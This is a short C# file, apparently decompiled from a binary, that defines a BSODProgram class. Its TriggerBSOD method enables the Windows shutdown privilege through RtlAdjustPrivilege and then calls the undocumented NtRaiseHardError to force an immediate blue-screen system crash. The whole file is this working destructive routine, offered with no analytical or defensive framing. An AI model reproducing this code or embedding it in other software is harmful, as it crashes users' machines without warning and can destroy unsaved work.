using System;
using System.Runtime.InteropServices;

namespace BSOD
{
	// Token: 0x02000003 RID: 3
	internal class BSODProgram
	{
		// Token: 0x06000005 RID: 5
		[DllImport("ntdll.dll")]
		public static extern int NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, uint Parameters, uint ValidResponseOption, out uint Response);

		// Token: 0x06000006 RID: 6
		[DllImport("ntdll.dll")]
		public static extern int RtlAdjustPrivilege(int Privilege, bool Enable, bool CurrentThread, out bool Enabled);

		// Token: 0x06000007 RID: 7 RVA: 0x000021B4 File Offset: 0x000003B4
		public static void TriggerBSOD()
		{
			bool flag2;
			bool flag = BSODProgram.RtlAdjustPrivilege(19, true, false, out flag2) == 0;
			if (flag)
			{
				uint num;
				BSODProgram.NtRaiseHardError(3221225474U, 0U, 0U, 0U, 6U, out num);
			}
		}

		// Token: 0x04000003 RID: 3
		private const int OPTION_SHUTDOWN = 6;

		// Token: 0x04000004 RID: 4
		private const int SHUTDOWN_PRIVILEGE = 19;

		// Token: 0x04000005 RID: 5
		private const uint STATUS_NOT_IMPLEMENTED = 3221225474U;
	}
}
